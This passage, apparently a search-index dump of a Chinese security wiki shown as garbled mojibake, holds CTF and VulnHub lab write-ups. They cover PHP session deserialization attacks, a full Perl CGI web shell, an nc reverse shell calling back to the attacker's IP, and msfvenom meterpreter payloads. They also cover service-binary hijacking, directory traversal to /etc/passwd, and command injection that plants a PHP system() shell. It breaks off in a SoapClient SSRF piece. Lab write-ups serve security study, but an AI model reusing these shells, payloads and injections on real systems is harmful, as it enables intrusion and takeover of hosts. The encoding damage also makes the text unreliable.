å¯¹è±¡å­˜å‚¨ç‰¹å®šç”¨æˆ·ä¼šè¯æ‰€éœ€çš„å±æ€§åŠé…ç½®ä¿¡æ¯ã€‚è¿™æ ·ï¼Œå½“ç”¨æˆ·åœ¨åº”ç”¨ç¨‹åºçš„ Web é¡µä¹‹é—´è·³è½¬æ—¶ï¼Œå­˜å‚¨åœ¨ Session å¯¹è±¡ä¸­çš„å˜é‡å°†ä¸ä¼šä¸¢å¤±ï¼Œè€Œæ˜¯åœ¨æ•´ä¸ªç”¨æˆ·ä¼šè¯ä¸­ä¸€ç›´å­˜åœ¨ä¸‹å»ã€‚å½“ç”¨æˆ·è¯·æ±‚æ¥è‡ªåº”ç”¨ç¨‹åºçš„ Web é¡µæ—¶ï¼Œå¦‚æœè¯¥ç”¨æˆ·è¿˜æ²¡æœ‰ä¼šè¯ï¼Œåˆ™ Web æœåŠ¡å™¨å°†è‡ªåŠ¨åˆ›å»ºä¸€ä¸ª Session å¯¹è±¡ã€‚å½“ä¼šè¯è¿‡æœŸæˆ–è¢«æ”¾å¼ƒåï¼ŒæœåŠ¡å™¨å°†ç»ˆæ­¢è¯¥ä¼šè¯ã€‚ å½“ç¬¬ä¸€æ¬¡è®¿é—®ç½‘ç«™æ—¶ï¼ŒSeesion_start()å‡½æ•°å°±ä¼šåˆ›å»ºä¸€ä¸ªå”¯ä¸€çš„Session IDï¼Œå¹¶è‡ªåŠ¨é€šè¿‡HTTPçš„å“åº”å¤´ï¼Œå°†è¿™ä¸ªSession IDä¿å­˜åˆ°å®¢æˆ·ç«¯Cookieä¸­ã€‚åŒæ—¶ï¼Œä¹Ÿåœ¨æœåŠ¡å™¨ç«¯åˆ›å»ºä¸€ä¸ªä»¥Session IDå‘½åçš„æ–‡ä»¶ï¼Œç”¨äºä¿å­˜è¿™ä¸ªç”¨æˆ·çš„ä¼šè¯ä¿¡æ¯ã€‚å½“åŒä¸€ä¸ªç”¨æˆ·å†æ¬¡è®¿é—®è¿™ä¸ªç½‘ç«™æ—¶ï¼Œä¹Ÿä¼šè‡ªåŠ¨é€šè¿‡HTTPçš„è¯·æ±‚å¤´å°†Cookieä¸­ä¿å­˜çš„Seesion IDå†æºå¸¦è¿‡æ¥ï¼Œè¿™æ—¶Session_start()å‡½æ•°å°±ä¸ä¼šå†å»åˆ†é…ä¸€ä¸ªæ–°çš„Session IDï¼Œè€Œæ˜¯åœ¨æœåŠ¡å™¨çš„ç¡¬ç›˜ä¸­å»å¯»æ‰¾å’Œè¿™ä¸ªSession IDåŒåçš„Sessionæ–‡ä»¶ï¼Œå°†è¿™ä¹‹å‰ä¸ºè¿™ä¸ªç”¨æˆ·ä¿å­˜çš„ä¼šè¯ä¿¡æ¯è¯»å‡ºï¼Œåœ¨å½“å‰è„šæœ¬ä¸­åº”ç”¨ï¼Œè¾¾åˆ°è·Ÿè¸ªè¿™ä¸ªç”¨æˆ·çš„ç›®çš„ã€‚ session çš„å­˜å‚¨æœºåˆ¶phpä¸­çš„sessionä¸­çš„å†…å®¹å¹¶ä¸æ˜¯æ”¾åœ¨å†…å­˜ä¸­çš„ï¼Œè€Œæ˜¯ä»¥æ–‡ä»¶çš„æ–¹å¼æ¥å­˜å‚¨çš„ï¼Œå­˜å‚¨æ–¹å¼å°±æ˜¯ç”±é…ç½®é¡¹session.save_handleræ¥è¿›è¡Œç¡®å®šçš„ï¼Œé»˜è®¤æ˜¯ä»¥æ–‡ä»¶çš„æ–¹å¼å­˜å‚¨ã€‚å­˜å‚¨çš„æ–‡ä»¶æ˜¯ä»¥sess_sessionidæ¥è¿›è¡Œå‘½åçš„ php_serialize ç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–æ•°ç»„ php é”®å+ç«–çº¿+ç»è¿‡serialize()å‡½æ•°å¤„ç†çš„å€¼ php_binary é”®åçš„é•¿åº¦å¯¹åº”çš„asciiå­—ç¬¦+é”®å+serialize()å‡½æ•°åºåˆ—åŒ–çš„å€¼ php.iniä¸­ä¸€äº›sessioné…ç½® session.save_pathâ€â€ â€“è®¾ç½®sessionçš„å­˜å‚¨è·¯å¾„session.save_handlerâ€â€â€“è®¾å®šç”¨æˆ·è‡ªå®šä¹‰å­˜å‚¨å‡½æ•°ï¼Œå¦‚æœæƒ³ä½¿ç”¨PHPå†…ç½®ä¼šè¯å­˜å‚¨æœºåˆ¶ä¹‹å¤–çš„å¯ä»¥ä½¿ç”¨æœ¬å‡½æ•°(æ•°æ®åº“ç­‰æ–¹å¼)session.auto_start boolenâ€“æŒ‡å®šä¼šè¯æ¨¡å—æ˜¯å¦åœ¨è¯·æ±‚å¼€å§‹æ—¶å¯åŠ¨ä¸€ä¸ªä¼šè¯é»˜è®¤ä¸º0ä¸å¯åŠ¨session.serialize_handler stringâ€“å®šä¹‰ç”¨æ¥åºåˆ—åŒ–ååºåˆ—åŒ–çš„å¤„ç†å™¨åå­—ã€‚é»˜è®¤ä½¿ç”¨php åˆ©ç”¨å§¿åŠ¿session.upload_progressè¿›è¡Œæ–‡ä»¶åŒ…å«å’Œååºåˆ—åŒ–æ¸—é€è¿™ç¯‡æ–‡ç« è¯´çš„å¾ˆè¯¦ç»†äº†ï¼Œæ²¡å¿…è¦ç­é—¨å¼„æ–§ https://www.freebuf.com/vuls/202819.html ä½¿ç”¨ä¸åŒçš„å¼•æ“æ¥å¤„ç†sessionæ–‡ä»¶$_SESSIONå˜é‡ç›´æ¥å¯æ§phpå¼•æ“çš„å­˜å‚¨æ ¼å¼æ˜¯é”®å|serialized_stringï¼Œè€Œphp_serializeå¼•æ“çš„å­˜å‚¨æ ¼å¼æ˜¯serialized_stringã€‚å¦‚æœç¨‹åºä½¿ç”¨ä¸¤ä¸ªå¼•æ“æ¥åˆ†åˆ«å¤„ç†çš„è¯å°±ä¼šå‡ºç°é—®é¢˜ æ¥çœ‹çœ‹è¿™ä¸¤ä¸ªphp // 1.php?phpini_set(session.serialize_handler, php_serialize);session_start();$_SESSION[y4] = $_GET[a];var_dump($_SESSION);//2.php?phpini_set(session.serialize_handler, php);session_start();class test public $name; function __wakeup() echo $this-name; é¦–å…ˆè®¿é—®1.phpï¼Œä¼ å…¥å‚æ•°a=|O:4:test:1:{s:4:name;s:8:y4tacker;}å†è®¿é—®2.phpï¼Œæ³¨æ„ä¸è¦å¿˜è®°| ç”±äº1.phpæ˜¯ä½¿ç”¨php_serializeå¼•æ“å¤„ç†ï¼Œå› æ­¤åªä¼šæŠŠ|å½“åšä¸€ä¸ªæ­£å¸¸çš„å­—ç¬¦ã€‚ç„¶åè®¿é—®2.phpï¼Œç”±äºç”¨çš„æ˜¯phpå¼•æ“ï¼Œå› æ­¤é‡åˆ°|æ—¶ä¼šå°†ä¹‹çœ‹åšé”®åä¸å€¼çš„åˆ†å‰²ç¬¦ï¼Œä»è€Œé€ æˆäº†æ­§ä¹‰ï¼Œå¯¼è‡´å…¶åœ¨è§£æsessionæ–‡ä»¶æ—¶ç›´æ¥å¯¹|åçš„å€¼è¿›è¡Œååºåˆ—åŒ–å¤„ç†ã€‚ è¿™é‡Œå¯èƒ½ä¼šæœ‰ä¸€ä¸ªå°ç–‘é—®ï¼Œä¸ºä»€ä¹ˆåœ¨è§£æsessionæ–‡ä»¶æ—¶ç›´æ¥å¯¹|åçš„å€¼è¿›è¡Œååºåˆ—åŒ–å¤„ç†ï¼Œè¿™ä¹Ÿæ˜¯å¤„ç†å™¨çš„åŠŸèƒ½ï¼Ÿè¿™ä¸ªå…¶å®æ˜¯å› ä¸ºsession_start()è¿™ä¸ªå‡½æ•°ï¼Œå¯ä»¥çœ‹ä¸‹å®˜æ–¹è¯´æ˜ï¼š å½“ä¼šè¯è‡ªåŠ¨å¼€å§‹æˆ–è€…é€šè¿‡ session_start() æ‰‹åŠ¨å¼€å§‹çš„æ—¶å€™ï¼Œ PHP å†…éƒ¨ä¼šè°ƒç”¨ä¼šè¯ç®¡ç†å™¨çš„ open å’Œ read å›è°ƒå‡½æ•°ã€‚ ä¼šè¯ç®¡ç†å™¨å¯èƒ½æ˜¯ PHP é»˜è®¤çš„ï¼Œ ä¹Ÿå¯èƒ½æ˜¯æ‰©å±•æä¾›çš„ï¼ˆSQLite æˆ–è€… Memcached æ‰©å±•ï¼‰ï¼Œ ä¹Ÿå¯èƒ½æ˜¯é€šè¿‡ session_set_save_handler() è®¾å®šçš„ç”¨æˆ·è‡ªå®šä¹‰ä¼šè¯ç®¡ç†å™¨ã€‚ é€šè¿‡ read å›è°ƒå‡½æ•°è¿”å›çš„ç°æœ‰ä¼šè¯æ•°æ®ï¼ˆä½¿ç”¨ç‰¹æ®Šçš„åºåˆ—åŒ–æ ¼å¼å­˜å‚¨ï¼‰ï¼ŒPHP ä¼šè‡ªåŠ¨ååºåˆ—åŒ–æ•°æ®å¹¶ä¸”å¡«å…… $_SESSION è¶…çº§å…¨å±€å˜é‡ å› æ­¤æˆ‘ä»¬æˆåŠŸè§¦å‘äº†testç±»ä¸­çš„__wakeup()æ–¹æ³•,æ‰€ä»¥è¿™ç§æ”»å‡»æ€è·¯æ˜¯å¯è¡Œçš„ã€‚ä½†è¿™ç§æ–¹æ³•æ˜¯åœ¨å¯ä»¥å¯¹sessionçš„è¿›è¡Œèµ‹å€¼çš„ï¼Œé‚£å¦‚æœä»£ç ä¸­ä¸å­˜åœ¨å¯¹$_SESSIONå˜é‡èµ‹å€¼çš„æƒ…å†µä¸‹åˆè¯¥å¦‚ä½•åˆ©ç”¨ $_SESSIONå˜é‡ç›´æ¥ä¸å¯æ§æˆ‘ä»¬æ¥çœ‹é«˜æ ¡æˆ˜ç–«çš„ä¸€é“CTFé¢˜ç›® ?php//A webshell is wait for youini_set(session.serialize_handler, php);session_start();class OowoO public $mdzz; function __construct() $this-mdzz = phpinfo();; function __destruct() eval($this-mdzz); if(isset($_GET[phpinfo])) $m = new OowoO();else highlight_string(file_get_contents(index.php));? æˆ‘ä»¬æ³¨æ„åˆ°è¿™æ ·ä¸€å¥è¯ini_set(session.serialize_handler, php);ï¼Œå› æ­¤ä¸éš¾çŒœæµ‹æœ¬èº«åœ¨php.iniå½“ä¸­çš„è®¾ç½®å¯èƒ½æ˜¯php_serializeï¼Œåœ¨æŸ¥çœ‹äº†phpinfoåå¾—è¯çŒœæµ‹æ­£ç¡®ï¼Œä¹ŸçŸ¥é“äº†è¿™é“é¢˜çš„è€ƒç‚¹ é‚£ä¹ˆæˆ‘ä»¬å°±è¿›å…¥phpinfoæŸ¥çœ‹ä¸€ä¸‹ï¼Œenabledonè¡¨ç¤ºupload_progressåŠŸèƒ½å¼€å§‹ï¼Œä¹Ÿæ„å‘³ç€å½“æµè§ˆå™¨å‘æœåŠ¡å™¨ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶æ—¶ï¼Œphpå°†ä¼šæŠŠæ­¤æ¬¡æ–‡ä»¶ä¸Šä¼ çš„è¯¦ç»†ä¿¡æ¯(å¦‚ä¸Šä¼ æ—¶é—´ã€ä¸Šä¼ è¿›åº¦ç­‰)å­˜å‚¨åœ¨sessionå½“ä¸­ ï¼›åªéœ€å¾€è¯¥åœ°å€ä»»æ„ POST ä¸€ä¸ªåä¸º PHP_SESSION_UPLOAD_PROGRESS çš„å­—æ®µï¼Œå°±å¯ä»¥å°†filenameçš„å€¼èµ‹å€¼åˆ°sessionä¸­ æ„é€ æ–‡ä»¶ä¸Šä¼ çš„è¡¨å• form action=http://web.jarvisoj.com:32784/index.php method=POST enctype=multipart/form-data input type=hidden name=777 / input type=file name=file / input type=submit //form æ¥ä¸‹æ¥æ„é€ åºåˆ—åŒ–payload ?phpini_set(session.serialize_handler, php_serialize);session_start();class OowoO public $mdzz=print_r(scandir(dirname(__FILE__)));;$obj = new OowoO();echo serialize($obj);? ç”±äºé‡‡ç”¨Burpå‘åŒ…ï¼Œä¸ºé˜²æ­¢åŒå¼•å·è¢«è½¬ä¹‰ï¼Œåœ¨åŒå¼•å·å‰åŠ ä¸Š\\ï¼Œé™¤æ­¤ä¹‹å¤–è¿˜è¦åŠ ä¸Š| åœ¨è¿™ä¸ªé¡µé¢éšä¾¿ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶ï¼Œç„¶åæŠ“åŒ…ä¿®æ”¹filenameçš„å€¼ å¯ä»¥çœ‹åˆ°Here_1s_7he_fl4g_buT_You_Cannot_see.phpè¿™ä¸ªæ–‡ä»¶ï¼Œflagè‚¯å®šåœ¨é‡Œé¢ï¼Œä½†è¿˜æœ‰ä¸€ä¸ªé—®é¢˜å°±æ˜¯ä¸çŸ¥é“è¿™ä¸ªè·¯å¾„ï¼Œè·¯å¾„çš„é—®é¢˜å°±éœ€è¦å›åˆ°phpinfoé¡µé¢å»æŸ¥çœ‹ å› æ­¤æˆ‘ä»¬åªéœ€è¦æŠŠpayloadï¼Œå½“ä¸­æ”¹ä¸ºprint_r(file_get_contents(/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php));å³å¯è·å–flag ?phpini_set(session.serialize_handler, php_serialize);session_start();class OowoO public $mdzz=print_r(file_get_contents(/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php));;$obj = new OowoO();echo serialize($obj);? å‚è€ƒæ–‡ç« https://xz.aliyun.com/t/2715 https://xz.aliyun.com/t/2613 https://threezh1.com/2019/09/09/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/ https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf https://blog.csdn.net/qq_43431158articledetails99544797 https://www.cnblogs.com/or4nge/p/13439974.html https://blog.zsxsoft.com/post/38 https://paper.seebug.org/680/ https://www.freebuf.com/articles/web/182231.html https://www.freebuf.com/vuls/202819.html"},{"title":"devrandom Scream","path":"/wiki/WP/Windowsææƒ/vulnhub/devrandom Scream.html","content":"å‰ækali IP 192.168.129.152 windows xp è®¾ç½®æˆNATæ¨¡å¼ ä¿¡æ¯æ”¶é›†æ‰«æipnmap -sP 192.168.129.024 ç›®æ ‡åº”è¯¥å°±æ˜¯ 192.168.129.163äº† æ‰«æç«¯å£ masscan 192.168.129.163 -p1-65535 â€“rate 100000 æ‰«å‡ºæ¥ 21ï¼Œ22ï¼Œ23ï¼Œ80ç«¯å£ nmap -sT -sV -Pn -v 192.168.129.163 -p 21,22,23,80 FTPnmap -sT -sV -Pn -v 192.168.129.163 -p 21,22,23,80 -A å°è¯•åŒ¿åç™»å½•åº”è¯¥æ˜¯ä¸‹é¢ææƒé‚£å—ï¼Œæ”¹æœåŠ¡å¯¼è‡´è¿ä¸ä¸Šftp è¡¨æ˜å¯èƒ½æ­£åœ¨è¿è¡Œ TFTP æœåŠ¡ æ‰«æudpnmap -sU -p- 192.168.129.163 tftp 192.163.129.163 putæ–‡ä»¶ï¼Œåœ¨æµè§ˆå™¨è®¿é—®ï¼Œçœ‹æ˜¯å¦æˆåŠŸ ç½‘é¡µè¢«æˆ‘ææŒ‚æ‰äº† ä½†ç¡®å®èƒ½è®¿é—®æˆåŠŸ ç„¶åé€šè¿‡ftpåŒ¿åç™»å½•ï¼Œå¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ªcgi-bin,å¯ä»¥å°è¯•ä¸Šä¼ è¿™ç±»æœ¨é©¬ ssh æ¸—é€æµ‹è¯•cgi-binè§£é‡ŠCGI ä»£è¡¨ é€šç”¨ç½‘å…³æ¥å£ã€‚â€Binâ€ æ˜¯ binaryï¼ˆäºŒè¿›åˆ¶ï¼‰ çš„ç¼©å†™ - ç»å¸¸ç”¨æ¥æŒ‡ä»£å¯æ‰§è¡Œæ–‡ä»¶æˆ–è„šæœ¬ã€‚ cgi-bin ç›®å½•æ˜¯ç½‘ç«™å¼€å‘è€…æ”¾ç½®å¯æ‰§è¡Œæ–‡ä»¶çš„åœ°æ–¹ï¼Œè¿™æ ·ä»–ä»¬çš„ç½‘ç«™å°±èƒ½æ‹¥æœ‰æ¯”çº¯ HTML æ›´å¤šçš„åŠŸèƒ½ã€‚ ä¸»æµçš„CGIç¨‹åºç”¨Perlç¼–å†™ ä¸Šä¼ perl æœ¨é©¬,è™½ç„¶ç•Œé¢ä¹±ç ï¼Œä½†ä¸å½±å“ä½¿ç”¨#!/usr/bin/perluse strict;use warnings;use CGI;use Cwd;print CGI::header(-type = text/html);my $query = new CGI;my $command = $query-param(command) || ;my $pwd = $query-param(pwd) || ;my $password = $query-param(password)|| ;my $filename = $query-script_name();# å¯†ç éªŒè¯if ($password ne yourpassword) print è¯·æä¾›æœ‰æ•ˆçš„å¯†ç  ; exit(0);# å¤„ç†å½“å‰ç›®å½•$pwd = `pwd` unless $pwd;chomp($pwd); # ç§»é™¤æœ«å°¾æ¢è¡Œç¬¦eval chdir($pwd) ;my $result = ;# æ‰§è¡Œå‘½ä»¤if ($command =~ /^cd\\s+(.+)$/) my $new_dir = $1; eval chdir($new_dir) ; $pwd = Cwd::cwd(); $result = `ls -la 21`; elsif ($command =~ /^cd\\s*$/) chdir($ENVHOME); $pwd = Cwd::cwd(); $result = `ls -la 21`; elsif ($command) $result = `$command 21`;# HTMLè¾“å‡ºprint qq!DOCTYPE htmlhtmlheadmeta charset=utf-8titleç½‘é¡µæ§åˆ¶å°/titlescriptwindow.onload = function() document.getElementById(command).focus();;/scriptstyle type=text/css.wide1 border: 2px solid #ccc; width: 98%; height: 400px; font-family: monospace; padding: 10px;.wide2 border: 2px solid #ccc; width: 70%; padding: 5px;.container margin: 20px;.info background-color: #f0f0f0; padding: 10px; margin-bottom: 10px;/style/headbodydiv class=container div class=info è„šæœ¬: $filename | å½“å‰ç›®å½•: $pwd /div pre class=wide1$result/pre form method=post action=$filename name=cmdForm label for=commandå‘½ä»¤:/label input class=wide2 name=command id=command autocomplete=off input type=submit value=æ‰§è¡Œ brbr input name=password value=$password type=hidden input name=pwd value=$pwd type=hidden /form/div/body/html;exit 0; æƒé™æå‡åå¼¹shell1.PowerCat.ps1(å¤±è´¥)é¶æœºæ˜¯ Windows XP ç²¾ç®€ç‰ˆ æˆ–è€… è€ IIS ç¯å¢ƒï¼Œç³»ç»Ÿç›®å½•é‡Œ æ²¡æœ‰ powershell.exe 2.nc.exetftp ä¸Šä¼ 32ä½nc.exe wget https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip unzip netcat-win32-1.11.zip cd netcat-1.11 tftp 192.168.129.163 binary å¿…é¡»å°†ä¼ è¾“æ¨¡å¼åˆ‡æ¢ä¸ºfont style=color:#DF2A3F;background-color:rgb(249, 242, 244);binary/fontï¼Œå¦åˆ™TFTPä¼šä¸Šä¼ çº¯æ–‡æœ¬ put nc.exe cgi-binnc.exe ç½‘é¡µç«¯æŸ¥çœ‹æ˜¯å¦ä¸Šä¼ æˆåŠŸ æˆåŠŸä¸Šä¼  kaliç›‘å¬nc -lvp 5555 ç½‘é¡µç«¯æ‰§è¡Œå‘½ä»¤nc -nv 192.168.129.152 5555 -e C:\\Windows\\System32\\cmd.exe 3.msfç”Ÿæˆæœ¨é©¬æ–‡ä»¶msfvenom -p windoesmeterpreterreverse_tcp LHOST192.168.129.152 LPORT5555 -f exe -o shell.exe tftpä¸Šä¼ åˆ°windows xpput shell.exe cgi-binshell.exe msf ç›‘å¬ç«¯å£use exploitmultihandler set payload windowsmeterpreterreverse_tcp set lport 5555 set lhost 192.168.129.152 ç½‘é¡µç«¯è¿è¡Œstart .\\shell.exe å†…æ ¸ææƒmsfè‡ªåŠ¨æŸ¥æ‰¾åˆ©ç”¨ä¹‹å‰åå¼¹çš„shellbg(æŠŠä¼šè¯æ”¾è¿›åç«¯) use postmultireconlocal_exploit_suggester(å…¨è‡ªåŠ¨) set session 2 (å› ä¸ºåå¼¹çš„shellæç¤ºä¼šè¯æ˜¯2) run æŸ¥æ‰¾å¯åˆ©ç”¨çš„ç‚¹ï¼Œç»¿è‰²çš„éƒ½å¯ä»¥è¯•è¯•use exploitwindowslocalms10_015_kitrap0d set session 2 set lhost 192.168.129.152 set lport 6666 msf å¦å¤–å¼€ä¸ªçª—å£ç›‘å¬ run ä¸‹é¢å¥½å‡ ä¸ªéƒ½å¯ä»¥ç”¨ï¼Œæœ‰ä¸€ä¸ªå°±å¯ä»¥ æ‰‹å·¥(æ‰€æœ‰è‡ªåŠ¨æ–¹æ³•ä¸è¡Œçš„è¯ï¼Œæœ€åå†æ‰‹å·¥ï¼Œæé«˜æ•ˆç‡)é”™è¯¯çš„ç³»ç»Ÿé…ç½®å·¥å…·ä¼ é€ winpeas ï¼Œaccesschktftp put winPEASx86.exe cgi-binwinPEASx86.exe å…ˆncåå¼¹shell winPEASæ£€æŸ¥æœåŠ¡é…ç½®é”™è¯¯.\\winPEASx86.exe quiet servicesinfo å¡ä½äº†ï¼Œåº”è¯¥æ˜¯ç³»ç»Ÿå¤ªè€äº†ï¼Œè·³è¿‡ msfå‰æ:å…ˆæœ‰ä¸€ä¸ªåå¼¹shelluse exploitwindowslocalservice_permissionsset session 1 å¦å¤–ä¸€ä¸ªmsfçª—å£ç›‘å¬ å¤±è´¥ï¼Œæ¢ä¸€ä¸ª use exploitwindowslocalunquoted_service_path å¤±è´¥ æ‰‹å·¥æŸ¥çœ‹ç³»ç»Ÿè¿›ç¨‹tasklist FI â€œusername eq SYSTEMâ€ è¿™å‡ ä¸ªéƒ½æ˜¯ç³»ç»Ÿè¿›ç¨‹ï¼Œå°è¯•èƒ½ä¸èƒ½åœæ­¢è¿›ç¨‹ æŸ¥çœ‹æœåŠ¡net start é€‰è¿™ä¸ªæ˜¯å› ä¸ºä¸å½±å“ç³»ç»ŸæœåŠ¡ net stop â€œFileZilla Server FTP serverâ€ æˆåŠŸï¼Œç„¶åæŸ¥æ‰¾æœåŠ¡è·¯å¾„cd C:\\ dir â€œFileZilla Server FTP serverâ€ s b è¿›å…¥ç›®å½•ï¼Œé€šè¿‡tftp binaryæ¨¡å¼ä¸Šä¼ msfç”Ÿæˆçš„æœ¨é©¬ï¼Œç„¶åä¸Šä¼ åˆ°å¯¹åº”ç›®å½•msfvenom -p windoesmeterpreterreverse_tcp LHOST192.168.129.152 LPORT4444 -f exe -o xx.exe å…ˆåœæ­¢æœåŠ¡ï¼Œç„¶åæŠŠå¯¹åº”æ–‡ä»¶å¤‡ä»½ï¼ŒæŠŠæœ¨é©¬æ¢æˆå¯¹åº”æ–‡ä»¶è¯­æ³• move â€œâ€œ â€œâ€œ æ³¨æ„ msf ç”Ÿæˆçš„æœ¨é©¬ï¼Œå¾—åˆ†æƒ…å†µèƒ½ä¸èƒ½ç”¨ncåå¼¹shell Payload ç±»å‹ èƒ½å¦ç”¨ NC æ¥æ”¶ å¤‡æ³¨ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);linux/x86/shell_reverse_tcp/font âœ… Yes æ ‡å‡† reverse shell font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);windows/shell_reverse_tcp/font âœ… Yes Windows cmd shell font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);java/shell_reverse_tcp/font âœ… Yes Java reverse shell font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);php/reverse_php/font âœ… Yes PHP reverse shell font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);meterpreter/reverse_tcp/font âŒ No éœ€è¦ MSF handler font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);staged/*/font âŒ No éœ€è¦ stager font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);bind_tcp/font variants âœ… Yes éœ€ä¸»åŠ¨è¿æ¥ç›®æ ‡ å¯åŠ¨æœåŠ¡å‰ï¼Œmsfå…ˆç›‘å¬çª—å£å¯åŠ¨æœåŠ¡ è¿˜æ˜¯è¿›ç¨‹è¿ç§»ä¸€ä¸‹ï¼Œä¸ç„¶ä¼šæ–­ ç»„ç­–ç•¥postwindowsgathercredentialsgppset session 1 å¤±è´¥ ä»¤ç‰Œçªƒå–ç›´æ¥å°è¯• getsystemæˆåŠŸ è·å–å¯†ç "},{"title":"Kioptrix 2014 (#5)","path":"/wiki/WP/Windowsææƒ/vulnhub/Kioptrix 2014 (#5).html","content":"å‰ækali ip 192.168.129.152ä¿¡æ¯æ”¶é›†ipæ”¶é›†nmap -sP 192.168.129.024 ç«¯å£æ”¶é›†nmap -sT -sV -Pn -v 192.168.129.164 -p- -A æ‰«æåˆ° 22ï¼Œ80ï¼Œ8080ï¼Œ ä½†æ˜¯22ç«¯å£å…³é—­äº† çœ‹çœ‹udp ç«¯å£ nmap -sU -p- 192.168.129.164 æ—  æ¸—é€æµ‹è¯•80ç«¯å£ æ£€æŸ¥æºä»£ç  è®¿é—® eholeæ‰«ææŒ‡çº¹ Apache,FreeBSD,mod_ssl,mod_dav, | Apache2.2.21 (FreeBSD) mod_ssl2.2.21 OpenSSL0.9.8q DAV2 PHP5.3.8 æ‰«ç§’æ˜¯å¦æœ‰æ¼æ´ æŸ¥çœ‹å†…å®¹ç›®å½•ç©¿è¶Šhttp://192.168.129.164/pChart2.1.3/examples/index.php?Action=ViewScript=%2f..%2f..%2fetc/passwd æœ‰ä¸‰ä¸ªç”¨æˆ·ï¼Œä½†éƒ½ä¸èƒ½ç™»å½•ï¼Œå°è¯•å†…æ ¸æ¼æ´ etcshadow æ²¡æœ‰æƒé™ å¯ä»¥æŸ¥çœ‹apacheçš„é…ç½®http://192.168.129.164/pChart2.1.3/examples/index.php?Action=ViewScript=%2f..%2f..%2fusr/local/etc/apache22/httpd.conf åªå…è®¸Mozilla4_browser æ›¿æ¢ä¸€ä¸‹ ä½¿ç”¨è¿™ä¸ªæ’ä»¶ï¼Œè‡ªå®šä¹‰ User-Agent :Mozilla4.0 ä½†æ˜¯æ„Ÿè§‰ä¸å¤ªå¥½ç”¨ï¼Œé»˜è®¤çš„è¯ï¼Œæµè§ˆå™¨ä¸èƒ½ç”¨ è¿˜æ˜¯ç”¨BPå§ æœä¸€ä¸‹æ˜¯ä»€ä¹ˆï¼Œå¤§æ¦‚æ˜¯cms æœ‰msfæ¨¡å—ï¼Œç›´æ¥ç”¨ å¤±è´¥ ç¿»çœ‹åˆ«äººç¬”è®°ï¼ŒåŸæ¥æ˜¯æ²¡æœ‰è®¾ç½®payload æœ€é‡è¦çš„ä¸€ç‚¹ï¼Œæ²¡æœ‰è®¾ç½®ua show advanced å¯ä»¥æŸ¥çœ‹è¯¦ç»†å†…å®¹ æ‰‹å·¥å°è¯• exploitdb æ˜¾ç¤º å¯ä»¥æœ‰ä¸¤ä¸ªæ–¹æ³• å°è¯•è¾“å…¥ä¸€å¥è¯æœ¨é©¬ http://192.168.129.164:8080/phptax/drawimage.php?pfilez=xxx;echo%20%27%3C?php%20echo%20system($_GET[%22cmd%22])%20?%3E%27%20%3E%202.php;pdfmake çœ‹çœ‹æˆåŠŸæ²¡æœ‰ å¯ä»¥æ‰§è¡Œå‘½ä»¤äº†ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼Œè¿æ¥èšå‰‘è¿ä¸ä¸Š èšå‰‘è¿ä¸ä¸ŠåŸå› :å¾—ç”¨é€‚ç”¨åˆé€‚çš„ä¸€å¥è¯æœ¨é©¬è¿™æ ·æ‰èƒ½è¿ä¸Š xsshttp://192.168.129.164/pChart2.1.3/examples/sandbox/script/session.php?%3Cscript%3Ealert(%27XSS%27)%3C/script%3E ä½†å¯¹ææƒä½œç”¨ä¸å¤§ 8080ç«¯å£ ç¦æ­¢è®¿é—® æƒé™æå‡æœç´¢æ¼æ´ searchsploit FreeBSD 9.0 28718.cæ²¡æœ‰æˆåŠŸï¼Œå°è¯•263è¿™ä¸ª ç³»ç»Ÿé‡Œåªæœ‰nc å’Œgcc kali å‘é€æ–‡ä»¶ nc -lvp 555526368.cå®¢æˆ·æœºæ¥å—æ–‡ä»¶ nc 192.168.129.152 5555 111.cç¼–è¯‘ï¼Œæ‰§è¡Œ è·å–ä¿¡æ¯ æ€»ç»“ ç¬¬ä¸€æ¬¡ç”¨searchsploit ä¸å¤ªç†Ÿç»ƒï¼Œè¿˜å¾—å¤šç”¨ï¼Œè‹±æ–‡è¿˜å¾—å¥½å¥½çœ‹ ä¸­å›½èšå‰‘è¿æ¥é—®é¢˜ ï¼šå¾—ç”¨ç›¸åº”æœ¨é©¬ï¼Œä¸ç„¶è¿ä¸ä¸Šèšå‰‘"},{"title":"Deserialization + __call + SoapClient + CRLF = SSRF","path":"/wiki/WP/ååºåˆ—åŒ–/php/Deserialization + __call + SoapClient + CRLF = SSRF.html","content":"phpä¸­çš„å†…ç½®ç±»?php$classes = get_declared_classes();foreach ($classes as $class) $methods = get_class_methods($class); foreach ($methods as $method) if (in_array($method, array( __destruct, __toString, __wakeup, __call, __callStatic, __get, __set, __isset, __unset, __invoke, __set_state ))) print $class . :: . $method . ; é¦–å…ˆæµ‹è¯•ä¸‹æ­£å¸¸æƒ…å†µä¸‹çš„SoapClientç±»ï¼Œè°ƒç”¨ä¸€ä¸ªä¸å­˜åœ¨çš„å‡½æ•°ï¼Œä¼šå»è°ƒç”¨__callæ–¹æ³• ?php$a = new SoapClient(null,array(uri=bbb, location=http://127.0.0.1:5555/path));$b = serialize($a);echo $b;$c = unserialize($b);$c-not_exists_function(); 